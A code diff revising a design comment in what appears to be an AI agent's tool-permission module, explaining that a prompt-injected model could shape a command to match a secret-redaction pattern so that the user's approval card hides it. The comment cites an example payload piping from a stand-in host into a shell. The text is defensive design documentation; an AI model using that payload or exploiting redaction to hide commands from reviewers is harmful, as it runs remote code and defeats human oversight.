@@ -1047,9 +1047,10 @@ export function governedAction(def: ToolDef, target: PolicyTarget): ToolActionCl
  * One limitation remains, and it is a property of redaction itself rather than of this choice: `command` is
  * fully model-controlled and the detector's patterns are public, so a prompt-injected model can shape a
  * payload to MATCH a pattern (`sh -c token:evil.example/x|sh`) and be shown `sh -c [redacted]` — which reads
- * as "we protected you" rather than "you cannot see this". Bounded by `allowedCommands` /
- * `allowedCommandGlobs` being deny-all by default and by the fs/egress floors, but real; surfacing "this was
- * redacted" to the prompt needs a schema field and is the open follow-up.
+ * as "we protected you" rather than "you cannot see this". Bounded, where no one can answer, by `allowedCommands` /
+ * `allowedCommandGlobs` being deny-all by default; in an interactive chat a command outside them now reaches the card
+ * (ADR-0118 §1), so there the bound is the card itself (step 4's command card shows the full argv, one argument per row)
+ * and the fs/egress floors, but real; surfacing "this was redacted" to the prompt needs a schema field and is the open follow-up.
  */
 function rawPreviewFor(action: ToolActionClass, target: PolicyTarget): ToolActionPreview {
   switch (action) {
